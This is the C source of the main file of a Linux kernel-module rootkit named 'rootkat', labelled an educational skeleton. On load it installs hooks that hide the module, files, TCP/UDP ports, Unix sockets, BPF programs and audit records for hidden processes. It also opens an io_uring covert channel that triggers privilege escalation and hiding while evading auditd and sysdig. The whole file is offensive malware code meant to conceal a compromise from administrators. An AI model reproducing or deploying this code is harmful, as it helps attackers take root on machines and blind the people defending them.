// SPDX-License-Identifier: MIT
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include "kallsyms.h"
#include "resolver.h"
#include "hook_m_show.h"
#include "hook_sys_kill.h"
#include "hook_filldir64.h"
#include "hook_tcp4_seq_show.h"
#include "hook_tcp6_seq_show.h"
#include "hook_udp_seq_show.h"
#include "hook_inet_sk_diag_fill.h"
#include "hook_sys_bpf.h"
#include "hook_audit.h"
#include "hook_unix_seq_show.h"
#include "hook_unix_diag.h"
#include "hook_io_issue_sqe.h"
#include "hidden_unix_paths.h"

#define ROOTKAT_TAG "rootkat: "

/*
 * Cross-module Rust integration: rootkat_rust_canary.ko (built only on
 * matrix entries with KERNEL_RUST=enabled) exports these. Weak-linked
 * so when the Rust LKM isn't loaded the symbols stay NULL and we skip
 * the call gracefully — keeps the C module loadable on its own.
 */
extern u32 rootkat_canary_tick(void) __attribute__((weak));
extern u32 rootkat_canary_value(void) __attribute__((weak));

static int __init rootkat_init(void)
{
	int rc;

	pr_info(ROOTKAT_TAG "loading\n");

	if (rootkat_canary_tick) {
		u32 ticks = rootkat_canary_tick();

		pr_info(ROOTKAT_TAG "rust canary present, tick=%u\n", ticks);
	} else {
		pr_info(ROOTKAT_TAG "rust canary not loaded (C-only build)\n");
	}

	rootkat_hidden_unix_paths_init();

	rc = rootkat_kallsyms_init();
	if (rc) {
		pr_err(ROOTKAT_TAG "kallsyms init failed: %d\n", rc);
		return rc;
	}

	rc = rootkat_hook_m_show_install();
	if (rc) {
		pr_err(ROOTKAT_TAG "self-hide hook failed: %d\n", rc);
		return rc;
	}

	rc = rootkat_hook_sys_kill_install();
	if (rc) {
		pr_err(ROOTKAT_TAG "sys_kill hook failed: %d\n", rc);
		rootkat_hook_m_show_remove();
		return rc;
	}

	rc = rootkat_hook_filldir64_install();
	if (rc) {
		pr_err(ROOTKAT_TAG "filldir64 hook failed: %d\n", rc);
		rootkat_hook_sys_kill_remove();
		rootkat_hook_m_show_remove();
		return rc;
	}

	rc = rootkat_hook_tcp4_seq_show_install();
	if (rc) {
		pr_err(ROOTKAT_TAG "tcp4_seq_show hook failed: %d\n", rc);
		rootkat_hook_filldir64_remove();
		rootkat_hook_sys_kill_remove();
		rootkat_hook_m_show_remove();
		return rc;
	}

	rc = rootkat_hook_tcp6_seq_show_install();
	if (rc) {
		pr_err(ROOTKAT_TAG "tcp6_seq_show hook failed: %d\n", rc);
		rootkat_hook_tcp4_seq_show_remove();
		rootkat_hook_filldir64_remove();
		rootkat_hook_sys_kill_remove();
		rootkat_hook_m_show_remove();
		return rc;
	}

	/* UDP port hiding — non-fatal, mirrors TCP. */
	rc = rootkat_hook_udp4_seq_show_install();
	if (rc)
		pr_warn(ROOTKAT_TAG "udp4_seq_show hook failed: %d\n", rc);
	rc = rootkat_hook_udp6_seq_show_install();
	if (rc)
		pr_warn(ROOTKAT_TAG "udp6_seq_show hook failed: %d\n", rc);

	/* Non-fatal: this hook depends on a symbol that may be inlined or
	 * renamed on some kernels. If it doesn't resolve, the ss(8) bypass
	 * stays open, but every other hook still works. Log + continue. */
	rc = rootkat_hook_inet_sk_diag_fill_install();
	if (rc)
		pr_warn(ROOTKAT_TAG "inet_sk_diag_fill hook failed: %d (ss bypass not closed)\n",
		        rc);

	/* Non-fatal: BPF prog self-hide. */
	rc = rootkat_hook_sys_bpf_install();
	if (rc)
		pr_warn(ROOTKAT_TAG "sys_bpf hook failed: %d (bpftool prog list will see us)\n",
		        rc);

	/* Non-fatal: audit log suppression for hidden PIDs. */
	rc = rootkat_hook_audit_log_start_install();
	if (rc)
		pr_warn(ROOTKAT_TAG "audit_log_start hook failed: %d\n", rc);

	/* Non-fatal: AF_UNIX path hide via /proc/net/unix. */
	rc = rootkat_hook_unix_seq_show_install();
	if (rc)
		pr_warn(ROOTKAT_TAG "unix_seq_show hook failed: %d (proc unix path not hidden)\n",
		        rc);

	/* Non-fatal: AF_UNIX path hide via NETLINK_SOCK_DIAG (`ss -lx`).
	 * Closes the v0.7 gap. Resolved via module-scoped lookup because
	 * sk_diag_fill is a static name colliding across diag modules. */
	rc = rootkat_hook_unix_diag_install();
	if (rc)
		pr_warn(ROOTKAT_TAG "unix_diag hook failed: %d (ss -lx not closed)\n",
		        rc);

	/* Non-fatal: io_uring covert-channel control surface. Lets a
	 * userspace process trigger privesc / hide-pid / hide-port via
	 * an IORING_OP_NOP SQE with a magic user_data, bypassing the
	 * kill-syscall path that auditd/sysdig typically watch. */
	rc = rootkat_hook_io_issue_sqe_install();
	if (rc)
		pr_warn(ROOTKAT_TAG "io_issue_sqe hook failed: %d (io_uring covert channel down)\n",
		        rc);

	pr_info(ROOTKAT_TAG "loaded (hidden)\n");
	return 0;
}

static void __exit rootkat_exit(void)
{
	rootkat_hook_io_issue_sqe_remove();
	rootkat_hook_unix_diag_remove();
	rootkat_hook_unix_seq_show_remove();
	rootkat_hook_audit_log_start_remove();
	rootkat_hook_sys_bpf_remove();
	rootkat_hook_inet_sk_diag_fill_remove();
	rootkat_hook_udp6_seq_show_remove();
	rootkat_hook_udp4_seq_show_remove();
	rootkat_hook_tcp6_seq_show_remove();
	rootkat_hook_tcp4_seq_show_remove();
	rootkat_hook_filldir64_remove();
	rootkat_hook_sys_kill_remove();
	rootkat_hook_m_show_remove();
	pr_info(ROOTKAT_TAG "unloaded\n");
}

module_init(rootkat_init);
module_exit(rootkat_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("rootkat");
MODULE_DESCRIPTION("Educational LKM rootkit skeleton");
MODULE_VERSION("0.0.1");
